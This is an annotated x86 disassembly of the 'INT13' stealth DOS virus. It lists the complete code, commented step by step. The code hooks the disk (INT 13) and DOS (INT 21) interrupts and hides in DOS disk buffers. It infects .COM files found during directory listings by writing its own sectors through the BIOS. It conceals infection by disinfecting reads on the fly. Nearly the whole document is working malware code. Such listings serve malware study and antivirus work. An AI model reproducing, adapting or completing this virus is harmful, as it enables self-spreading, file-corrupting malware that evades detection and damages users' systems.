-----------------------------------------------------------------------
             INT13 (LABEL) STEALTH VIRUS
-----------------------------------------------------------------------
-----------------------------------------------------------------------
EXECUTION OF VIRUS CODE STARTS HERE.
-----------------------------------------------------------------------
CS:0100 E200           LOOP      0102 (Mark of infection)
CS:0102 50             PUSH      AX
-----------------------------------------------------------------------
    Point DS:DI to INT 13 address in interrupt table.
-----------------------------------------------------------------------
CS:0103 BF4C00         MOV       DI,004C 
CS:0106 57             PUSH      DI 
CS:0107 33ED           XOR       BP,BP
CS:0109 8EDD           MOV       DS,BP 
-----------------------------------------------------------------------
    Get INT 13 address.
-----------------------------------------------------------------------
CS:010B C41D           LES       BX,DWord Ptr [DI]
-----------------------------------------------------------------------
    Point DS:DI to INT 9D in table
-----------------------------------------------------------------------
CS:010D BF7402         MOV       DI,0274
-----------------------------------------------------------------------
    Store current INT 13 address in INT 9E
-----------------------------------------------------------------------
CS:0110 895DFC         MOV       Word Ptr [DI-04],BX 
CS:0113 8C45FE         MOV       Word Ptr [DI-02],ES 
-----------------------------------------------------------------------
    Get ROM entry for INT 13 with INT 2F (ax = 13)
-----------------------------------------------------------------------
CS:0116 B413           MOV       AH,13 
CS:0118 CD2F           INT       2F 
CS:011A 06             PUSH      ES
CS:011B 53             PUSH      BX 
CS:011C CD2F           INT       2F 
CS:011E 8EC5           MOV       ES,BP
-----------------------------------------------------------------------
    Point SI to INT 21 vector
-----------------------------------------------------------------------
CS:0120 BE8400         MOV       SI,0084
-----------------------------------------------------------------------
    Store BIOS INT 13 as INT 9D
-----------------------------------------------------------------------
CS:0123 58             POP       AX 
CS:0124 AB             STOSW      
CS:0125 58             POP       AX 
CS:0126 AB             STOSW      
CS:0127 56             PUSH      SI 
-----------------------------------------------------------------------
    Store current INT 21 as INT 9E
-----------------------------------------------------------------------
CS:0128 A5             MOVSW
CS:0129 A5             MOVSW      
-----------------------------------------------------------------------
    Get DOS List of Lists with INT 21 (ah = 52)
-----------------------------------------------------------------------
CS:012A B452           MOV       AH,52
CS:012C CD21           INT       21

CS:012E 06             PUSH      ES 
CS:012F 1F             POP       DS 
-----------------------------------------------------------------------
    Get pointer to first disk buffer.
-----------------------------------------------------------------------
CS:0130 C44712         LES       AX,DWord Ptr [BX+12] 
-----------------------------------------------------------------------
    PUSH address of next buffer.
-----------------------------------------------------------------------
CS:0133 26FF7602       PUSH      Word Ptr ES:[BP+02] 
-----------------------------------------------------------------------
    SI = 100 = beginning of virus = size in words (slick).
-----------------------------------------------------------------------
CS:0137 BE0001         MOV       SI,0100
CS:013A 8BCE           MOV       CX,SI 
CS:013C 8BFD           MOV       DI,BP 
CS:013E 56             PUSH      SI 
-----------------------------------------------------------------------
    Copy self to DOS disk buffer
-----------------------------------------------------------------------
CS:013F F3             REP        
CS:0140 2EA5           MOVSW      CS: 
CS:0142 5E             POP       SI
-----------------------------------------------------------------------
    POP next buffer address into first buffer address.
-----------------------------------------------------------------------
CS:0143 8F4714         POP       Word Ptr [BX+14]
CS:0146 06             PUSH      ES 
CS:0147 B055           MOV       AL,55 
CS:0149 50             PUSH      AX 
-----------------------------------------------------------------------
    Return far to code in DOS buffer
-----------------------------------------------------------------------
CS:014A CB             RETF      (=JMP TO 0155)
-----------------------------------------------------------------------
    DATA
-----------------------------------------------------------------------
CS:014B                DW        Cylinder_Sector
CS:014D                DW        Head_Drive
CS:014F                DW        Buffer_Offset
CS:0151                DW        Buffer_Segment
CS:0153                DW        0

-----------------------------------------------------------------------
EXECUTION IN DOS BUFFER STARTS HERE.
-----------------------------------------------------------------------
    Hook INT 21 to local handler.
-----------------------------------------------------------------------
CS:0155 8EC5           MOV       ES,BP
CS:0157 5F             POP       DI
CS:0158 B0F5           MOV       AL,F5
CS:015A AB             STOSW      
-----------------------------------------------------------------------
    Hook INT 13 to local handler.
-----------------------------------------------------------------------
CS:015B 268C0D         MOV       Word Ptr ES:[DI],CS
CS:015E 5F             POP       DI 
CS:015F B0AB           MOV       AL,AB 
CS:0161 AB             STOSW      
-----------------------------------------------------------------------
    Get environment segment address from PSP.
-----------------------------------------------------------------------
CS:0162 268C0D         MOV       Word Ptr ES:[DI],CS
CS:0165 8E462C         MOV       ES,Word Ptr [BP+2C] 
CS:0168 8BFD           MOV       DI,BP 
CS:016A 95             XCHG      AX,BP 
CS:016B 49             DEC       CX 
CS:016C F2AE           REPNE     SCASB 

CS:016E AE             SCASB      
CS:016F 75FB           JNZ       016C 
CS:0171 AF             SCASW      

CS:0172 06             PUSH      ES 
CS:0173 1F             POP       DS 
CS:0174 8BD7           MOV       DX,DI 
-----------------------------------------------------------------------
    Read infected host over top of self where DOS loaded.
-----------------------------------------------------------------------
CS:0176 B43D           MOV       AH,3D
CS:0178 CD21           INT       21============>Open handle

CS:017A 7213           JB        018F 
CS:017C 8BD6           MOV       DX,SI 
CS:017E 93             XCHG      AX,BX 

CS:017F B43F           MOV       AH,3F 
CS:0181 16             PUSH      SS 
CS:0182 1F             POP       DS 
CS:0183 CD21           INT       21============>Read handle

CS:0185 B43E           MOV       AH,3E 
CS:0187 CD21           INT       21============>Close handle
-----------------------------------------------------------------------
    Stealth routine has cleaned copy -- go execute host code.
-----------------------------------------------------------------------
CS:0189 58             POP       AX
CS:018A 16             PUSH      SS 
CS:018B 56             PUSH      SI 
CS:018C 16             PUSH      SS 
CS:018D 07             POP       ES 
CS:018E CB             RETF       

CS:018F B44C           MOV       AH,4C 
CS:0191 CD21           INT       21============>Exit
-----------------------------------------------------------------------
    Temp INT 13 handler for seek EOF to collect sector info.
-----------------------------------------------------------------------
CS:0193 2E891E4F00     MOV       Word Ptr CS:[004F],BX
CS:0198 2E890E4B00     MOV       Word Ptr CS:[004B],CX 
CS:019D 2E89164D00     MOV       Word Ptr CS:[004D],DX 
CS:01A2 2E8C065100     MOV       Word Ptr CS:[0051],ES 

CS:01A7 CD9C           INT       9C=(TRUE 13)=>

CS:01A9 EB47           JMP       01F2
-----------------------------------------------------------------------
    INT 13 Handler -- Intercepts sector reads
-----------------------------------------------------------------------
CS:01AB 80FC02         CMP       AH,02
CS:01AE 75F7           JNZ       01A7 

CS:01B0 1E             PUSH      DS 
CS:01B1 56             PUSH      SI 
CS:01B2 57             PUSH      DI 
CS:01B3 51             PUSH      CX 
CS:01B4 52             PUSH      DX 
CS:01B5 06             PUSH      ES 
CS:01B6 53             PUSH      BX 
CS:01B7 52             PUSH      DX 

CS:01B8 CD9C           INT       9C=(TRUE 13)=>

CS:01BA 5A             POP       DX 
CS:01BB 722E           JB        01EB 
-----------------------------------------------------------------------
    See if sector in start of infected file (1st word = E200).
-----------------------------------------------------------------------
CS:01BD 26813FE200     CMP       Word Ptr ES:[BX],00E2 
CS:01C2 F8             CLC        
CS:01C3 7526           JNZ       01EB 
-----------------------------------------------------------------------
    Disinfect-on-the-fly stealth routine.
-----------------------------------------------------------------------
CS:01C5 B80202         MOV       AX,0202 
CS:01C8 268B4F4B       MOV       CX,Word Ptr ES:[BX+4B] 
CS:01CC 268A774E       MOV       DH,Byte Ptr ES:[BX+4E] 
-----------------------------------------------------------------------
        Point to middle of video memory as buffer.
-----------------------------------------------------------------------
CS:01D0 BB00B8         MOV       BX,B800 
CS:01D3 8EDB           MOV       DS,BX 
CS:01D5 8EC3           MOV       ES,BX 
CS:01D7 B778           MOV       BH,78 

CS:01D9 CD9D           INT       9D=(BIOS 13)=>Read 2 Sectors

CS:01DB 720E           JB        01EB 
CS:01DD BE007A         MOV       SI,7A00 
CS:01E0 5B             POP       BX 
CS:01E1 8BFB           MOV       DI,BX 
CS:01E3 07             POP       ES 
CS:01E4 B90001         MOV       CX,0100 
CS:01E7 F3A5           REP       MOVSW 
CS:01E9 EB02           JMP       01ED 

CS:01EB 5B             POP       BX 
CS:01EC 07             POP       ES 

CS:01ED 5A             POP       DX 
CS:01EE 59             POP       CX 
CS:01EF 5F             POP       DI 
CS:01F0 5E             POP       SI 
CS:01F1 1F             POP       DS 

CS:01F2 CA0200         RETF      0002 
-----------------------------------------------------------------------
    INT 21 Handler -- Intercepts FCB find next.
-----------------------------------------------------------------------
CS:01F5 80FC12         CMP       AH,12
CS:01F8 7404           JZ        01FE 

CS:01FA CD9E           INT       9E============>INT 21

CS:01FC EBF4           JMP       01F2 

CS:01FE CD9E           INT       9E============>INT 21

CS:0200 3C00           CMP       AL,00 
CS:0202 75EE           JNZ       01F2 

CS:0204 50             PUSH      AX 
CS:0205 53             PUSH      BX 
CS:0206 1E             PUSH      DS 
CS:0207 06             PUSH      ES 

CS:0208 B42F           MOV       AH,2F 
CS:020A CD9E           INT       9E============>Get DTA

CS:020C 06             PUSH      ES 
CS:020D 1F             POP       DS 
-----------------------------------------------------------------------
    Is it .COM but not COMMAND.COM
-----------------------------------------------------------------------
CS:020E B84F4D         MOV       AX,4D4F  ( = 'OM'"
CS:0211 3B4711         CMP       AX,Word Ptr [BX+11] ( = last 2 bytes)
CS:0214 7527           JNZ       023D 

CS:0216 3B4709         CMP       AX,Word Ptr [BX+09] ( = bytes 2 & 3)
CS:0219 7422           JZ        023D 

CS:021B 8A4707         MOV       AL,Byte Ptr [BX+07] 
CS:021E 0440           ADD       AL,40 
CS:0220 51             PUSH      CX 
CS:0221 52             PUSH      DX 
CS:0222 8B4F24         MOV       CX,Word Ptr [BX+24] 
CS:0225 BA0002         MOV       DX,0200 
CS:0228 3BCA           CMP       CX,DX 
CS:022A 720F           JB        023B 
CS:022C 49             DEC       CX 
CS:022D F6C502         TEST      CH,02 
CS:0230 7411           JZ        0243 
CS:0232 3C43           CMP       AL,43 
CS:0234 7205           JB        023B 
CS:0236 F6C504         TEST      CH,04 
CS:0239 7408           JZ        0243 

CS:023B 5A             POP       DX 
CS:023C 59             POP       CX 

CS:023D 07             POP       ES 
CS:023E 1F             POP       DS 
CS:023F 5B             POP       BX 
CS:0240 58             POP       AX 
CS:0241 EBAF           JMP       01F2 

CS:0243 56             PUSH      SI 
CS:0244 57             PUSH      DI 
CS:0245 0E             PUSH      CS 
CS:0246 07             POP       ES 
CS:0247 8BFA           MOV       DI,DX 
CS:0249 8D7708         LEA       SI,Word Ptr [BX+08] 
CS:024C B43A           MOV       AH,3A 
CS:024E AB             STOSW      
CS:024F A5             MOVSW      
CS:0250 A5             MOVSW      
CS:0251 A5             MOVSW      
CS:0252 A5             MOVSW      
CS:0253 B02E           MOV       AL,2E 
CS:0255 AA             STOSB      
CS:0256 A5             MOVSW      
CS:0257 A4             MOVSB      
CS:0258 33C0           XOR       AX,AX 
CS:025A AA             STOSB      
CS:025B 8ED8           MOV       DS,AX 
CS:025D 8EC0           MOV       ES,AX 
CS:025F BE4C00         MOV       SI,004C 
CS:0262 BF7C02         MOV       DI,027C 
CS:0265 56             PUSH      SI 
CS:0266 57             PUSH      DI 
CS:0267 06             PUSH      ES 
CS:0268 A5             MOVSW      
CS:0269 A5             MOVSW
-----------------------------------------------------------------------
    Set up temp INT 13 handler.
-----------------------------------------------------------------------
CS:026A C744FC9300     MOV       Word Ptr [SI-04],0093
CS:026F 8C4CFE         MOV       Word Ptr [SI-02],CS 
CS:0272 0E             PUSH      CS 
CS:0273 1F             POP       DS 

CS:0274 B43D           MOV       AH,3D 
CS:0276 CD9E           INT       9E============>Open Handle

CS:0278 93             XCHG      AX,BX 

CS:0279 B80242         MOV       AX,4202 
CS:027C B9FFFF         MOV       CX,FFFF 
CS:027F 8BD1           MOV       DX,CX 
CS:0281 CD9E           INT       9E============>Set Pointer EOF

CS:0283 B43F           MOV       AH,3F 
CS:0285 B253           MOV       DL,53 
CS:0287 8BFA           MOV       DI,DX 
CS:0289 F7D9           NEG       CX 
CS:028B CD9E           INT       9E============>Read Handle

CS:028D FF75F8         PUSH      Word Ptr [DI-08] 
CS:0290 FF75FA         PUSH      Word Ptr [DI-06] 

CS:0293 B80042         MOV       AX,4200 
CS:0296 33C9           XOR       CX,CX 
CS:0298 33D2           XOR       DX,DX 
CS:029A CD9E           INT       9E============>Set Pointer 0

CS:029C B43F           MOV       AH,3F 
CS:029E 8BD7           MOV       DX,DI 
CS:02A0 B102           MOV       CL,02 
CS:02A2 CD9E           INT       9E============>Read Handle

CS:02A4 8B05           MOV       AX,Word Ptr [DI] 
CS:02A6 5A             POP       DX 
CS:02A7 59             POP       CX 
-----------------------------------------------------------------------
    Make sure not infected or false .COM
-----------------------------------------------------------------------
CS:02A8 3DE200         CMP       AX,00E2 (= Infected)
CS:02AB 743C           JZ        02E9 
CS:02AD 3D4D5A         CMP       AX,5A4D (= 'MZ')
CS:02B0 7437           JZ        02E9 

CS:02B2 B80202         MOV       AX,0202 
CS:02B5 51             PUSH      CX 
CS:02B6 52             PUSH      DX 
CS:02B7 BB00B8         MOV       BX,B800 
CS:02BA 8EC3           MOV       ES,BX 
CS:02BC B778           MOV       BH,78 
CS:02BE CD9D           INT       9D=(BIOS 13)=>Read 2 Sectors

CS:02C0 C575FC         LDS       SI,DWord Ptr [DI-04] 
CS:02C3 57             PUSH      DI 
CS:02C4 BF007A         MOV       DI,7A00 
CS:02C7 B90001         MOV       CX,0100 
CS:02CA F3A5           REP       MOVSW 
CS:02CC 5F             POP       DI 
CS:02CD B80203         MOV       AX,0302 
CS:02D0 5A             POP       DX 
CS:02D1 59             POP       CX 
CS:02D2 51             PUSH      CX 
CS:02D3 52             PUSH      DX 
CS:02D4 CD9D           INT       9D=(BIOS 13)=>Write Sector

CS:02D6 5A             POP       DX 
CS:02D7 59             POP       CX 

CS:02D8 B80103         MOV       AX,0301 
CS:02DB 2E874DF8       XCHG      CX,Word Ptr CS:[DI-08] 
CS:02DF 2E8755FA       XCHG      DX,Word Ptr CS:[DI-06] 
CS:02E3 0E             PUSH      CS 
CS:02E4 07             POP       ES 
CS:02E5 33DB           XOR       BX,BX 
CS:02E7 CD9D           INT       9D=(BIOS 13)=>Write Sector

CS:02E9 B43E           MOV       AH,3E 
CS:02EB CD9E           INT       9E============>Close handle

CS:02ED 07             POP       ES 
CS:02EE 5E             POP       SI 
CS:02EF 5F             POP       DI 
CS:02F0 26A5           MOVSW      ES: 
CS:02F2 26A5           MOVSW      ES: 
CS:02F4 5F             POP       DI 
CS:02F5 5E             POP       SI 

CS:02F6 E942FF         JMP       023B 

20 49 6E 74 20 31 33   DB        ' Int 13'
